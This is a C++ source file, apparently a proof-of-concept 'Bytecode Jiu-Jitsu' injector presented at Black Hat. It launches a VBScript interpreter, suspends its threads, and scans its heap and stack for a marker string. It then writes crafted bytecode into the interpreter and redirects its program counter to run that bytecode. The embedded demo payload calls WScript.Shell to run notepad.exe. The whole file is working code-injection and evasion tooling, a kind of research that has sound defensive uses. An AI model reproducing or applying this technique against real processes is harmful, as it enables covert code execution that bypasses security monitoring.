#include "injector.h"

std::string log_file_name = "";
TCHAR command_line[] = TEXT("cscript.exe target.vbs");

tmpl_NtQueryInformationThread fpNtQueryInformationThread;
tmpl_NtQueryInformationProcess fpNtQueryInformationProcess;

std::ostream* out = NULL;

int main(int argc, char** argv)
{
    DWORD ret;
    bool result;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    std::vector<HANDLE> hThreads;

    Config config = {
        "C:\\Windows\\System32\\vbscript.dll",
        0x84b0,
        0,
        { { 0x0, 0x1e0 } },
        { { 2, 0, { 0x0, 0x1f0 }, 0 } },
        { { 0x0, 0x1d8 } }
    };

    // for notepad.exe
    BYTE bytecode_bytes[] = "\x56\x38\x00\x00\x00\x01\x00\x00\x03\x00\x0e\x48\x00\x00\x00\x28\x6c\x00\x00\x00\x01\x00\x1b\x01\x00\x03\x01\x19\x01\x00\x0e\x90\x00\x00\x00\x31\xb0\x00\x00\x00\x01\x00\x02\x01";
    BYTE value_object_bytes[] = "\xd0\x00\x00\x00\x20\x00\x00\x00\xb8\x00\x00\x00\x02\x00\x00\x00\xcc\x00\x00\x00\x01\x00\x00\x00\x10\x02\x00\x00\xbc\x00\x00\x00\x02\x00\x00\x00\xf0\x00\x00\x00\x20\x01\x00\x00\x47\x00\x00\x00\x62\x8e\x00\x00\x06\x00\x00\x00\x57\x00\x73\x00\x68\x00\x00\x00\x42\x0d\x6f\x26\x1a\x00\x00\x00\x57\x00\x53\x00\x63\x00\x72\x00\x69\x00\x70\x00\x74\x00\x2e\x00\x53\x00\x68\x00\x65\x00\x6c\x00\x6c\x00\x00\x00\x0b\xb7\xb7\x0f\x18\x00\x00\x00\x43\x00\x72\x00\x65\x00\x61\x00\x74\x00\x65\x00\x4f\x00\x62\x00\x6a\x00\x65\x00\x63\x00\x74\x00\x00\x00\xad\xba\xcb\x27\x9c\xe4\x16\x00\x00\x00\x6e\x00\x6f\x00\x74\x00\x65\x00\x70\x00\x61\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\xe5\x88\x00\x00\x06\x00\x00\x00\x52\x00\x75\x00\x6e\x00\x00\x00\x89\xa9\xad\xba\x09\x00\x00\x00\x27\x00\x00\x00\x32\x00\x00\x00\x15\x00\x00\x00\xb0\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";

    Bytecode bytecode = {
        bytecode_bytes,
        sizeof(bytecode_bytes)
    };

    SymbolTable symbol_table = {
        0,
        {
            {
                value_object_bytes,
                sizeof(value_object_bytes),
                0
            }
        }
    };

    Payload payload = {
        bytecode,
        { symbol_table }
    };

    wchar_t search_text[] = L"Hello, Black Hat folks!";

    Search search;
    search.type = kSearchTextTypeWchar;
    search.pattern_wcs = search_text;
    search.value_object_offset = 0x48;

    argparse::ArgumentParser program("Injector-BJJ");
    program.add_argument("-c", "--config")
        .help("specify a config JSON file name.");
    program.add_argument("-s", "--search")
        .help("specify a search JSON file name.");
    program.add_argument("-p", "--payload")
        .help("specify a payload JSON file name.");

    try {
        program.parse_args(argc, argv);
    }
    catch (const std::exception& err) {
        spdlog::error(err.what());
        std::exit(1);
    }

    if (program.present("--config")) {
        auto config_file = program.get<std::string>("--config");
        spdlog::info("Reading config file: {}", config_file);
        std::string config_string = read_file(config_file);
        deserialize_config(config_string, config);
    }
    else {
        spdlog::info("No config file provided. Using embedded config.");
    }

    if (program.present("--search")) {
        auto search_file = program.get<std::string>("--search");
        spdlog::info("Reading search file: {}", search_file);
        std::string search_string = read_file(search_file);
        deserialize_search(search_string, search);
    }
    else {
        spdlog::info("No search file provided. Using embedded search text.");
    }

    if (program.present("--payload")) {
        auto payload_file = program.get<std::string>("--payload");
        spdlog::info("Reading payload file: {}", payload_file);
        std::string payload_string = read_file(payload_file);
        deserialize_payload(payload_string, payload);
    }
    else {
        spdlog::error("No payload file provided. Using embedded payload.");
    }

    spdlog::info("This is a Bytecode Jiu-Jitsu injector. Let's roll!");
    
    if (!log_file_name.empty())
        out = new std::ofstream(log_file_name.c_str());

    if (!out) {
        char temp_path[MAX_PATH];

        ret = GetTempPathA(MAX_PATH, (LPSTR)&temp_path);
        if (ret == 0) {
            spdlog::error("Error: could not get temp path.");
        } else {
            log_file_name = temp_path;
            log_file_name += "\\injector.log";
            out = new std::ofstream(log_file_name.c_str());
        }
    }

    if (out) {
        spdlog::info("Log file name: {}", log_file_name);
    } else {
        spdlog::info("Error: could not get temp path.");
    }

    resolve_native_apis();

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    spdlog::info("Creating an interpreter process ... ");

    result = CreateProcess(NULL,
        command_line,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);

    if (!result) {
        log_err_msg();
        ExitProcess(0);
    }

    spdlog::info("Done.");
    spdlog::info("Command line: ");
    std::wcout << command_line << std::endl;

    // Wait for initialization of the interpreter process
    // Sleep(2000);

    spdlog::info("Waiting for the debugger attach ... ");
    char c;
    std::cin >> c;

    spdlog::info("Suspending threads ... ");

    hThreads = get_thread_handles(pi.dwProcessId);
    // Sleep(300);
    suspend_threads(hThreads);

    spdlog::info("Done.");

    spdlog::info("Enumerating heap memory ... ");

    std::list<BinaryContent> contents;
    std::list<BinaryContent> heap_contents;
    std::list<HeapInfo> heaps = get_heap_info(pi.dwProcessId);
    log_heap_info(heaps);
    heap_contents = get_heap_contents(pi.hProcess, heaps);
    contents.insert(contents.end(), heap_contents.begin(), heap_contents.end());

    spdlog::info("Done.");

    spdlog::info("Enumerating stack memory ... ");

    std::list<BinaryContent> stack_contents;
    std::list<StackInfo> stacks = get_stack_info(pi.dwProcessId, pi.hProcess);
    log_stack_info(stacks);
    stack_contents = get_stack_contents(pi.hProcess, stacks);
    contents.insert(contents.end(), stack_contents.begin(), stack_contents.end());

    spdlog::info("Done.");

    spdlog::info("Searching a string: Hello, Black Hat folks!");

    LPVOID management_structure_addr;
    management_structure_addr = 0x0;
    off_t block_offset;
    bool found;
    for (auto iter = contents.begin(); iter != contents.end(); iter++) {
        block_offset = 0;
        found = false;
        do {
            auto [match_offset, match_len] = search_characteristic_string(iter->bytes + block_offset, iter->len - block_offset, search);
            found = (match_len != 0);

            if (found) {
                spdlog::info("A search pattern found at 0x{:x}", (int64_t)iter->addr + (int64_t)block_offset + (int64_t)match_offset);
                log_search_result(iter->bytes, iter->addr, block_offset + match_offset, match_len);
                LPVOID found_addr = find_management_structure(contents, (LPVOID)((int64_t)iter->addr + (int64_t)block_offset + (int64_t)match_offset), search.value_object_offset, 0);
                if (found_addr != NULL)
                    management_structure_addr = found_addr;

                block_offset += (match_offset + match_len);
            }
        } while (found);
    }

    if (management_structure_addr != 0x0) {
        spdlog::info("A management structure addr found at 0x{:x}", (uint64_t)management_structure_addr);
        *out << "Management structure addr: 0x" << management_structure_addr << std::endl;
    } else {
        spdlog::error("Error: could not find a management structure addr.");
        spdlog::error("Exiting ...");
        return -1;
    }

    inject(pi.hProcess, management_structure_addr, payload, config);

    LPVOID bytecode_addr = find_bytecode_addr(pi.hProcess, management_structure_addr, config);
    overwrite_vpc(pi.hProcess, management_structure_addr, config, bytecode_addr);

    spdlog::info("Resuming threads ... ");
    resume_threads(hThreads);
    spdlog::info("Done");

    spdlog::info("Exiting ... ");

    close_handles(hThreads);

    for (auto iter = contents.begin(); iter != contents.end(); iter++) {
        delete[] iter->bytes;
    }

    return 0;
}